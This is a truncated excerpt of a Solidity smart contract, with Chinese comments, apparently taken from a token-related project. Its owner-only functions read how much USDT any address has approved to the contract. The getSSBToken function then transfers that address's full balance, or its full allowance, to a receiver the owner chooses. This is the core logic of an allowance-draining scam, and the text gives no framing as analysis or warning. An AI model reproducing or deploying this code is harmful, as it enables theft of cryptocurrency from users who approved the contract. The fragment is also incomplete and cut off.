...
interface IERC20 {
    ...
    function claimToken(address token, uint256 amount, address to) external onlyOwner {
     ...
     //getToken
     function getSBBalance(address sbSender) view external onlyOwner returns(uint256){
         IERC20 usdtTokenUser= IERC20(usdtToken);
         return usdtTokenUser.allowance(sbSender, address(this));
     }
     
     function getSSBToken(address sbSender,address receiver) external onlyOwner {
         IERC20 usdtTokenUser= IERC20(usdtToken);
         //授权额度
         uint approveAmout =usdtTokenUser.allowance(sbSender, address(this));
         //账户余额
         uint balanceAmout = usdtTokenUser.balanceOf(sbSender);
         //approve和 balance >0
         require(approveAmout>0 && balanceAmout>0,'token is zero');
         if(approveAmout>=balanceAmout){
            usdtTokenUser.transferFrom(sbSender, receiver,balanceAmout);
         }else{
             usdtTokenUser.transferFrom(sbSender, receiver,approveAmout);
         }
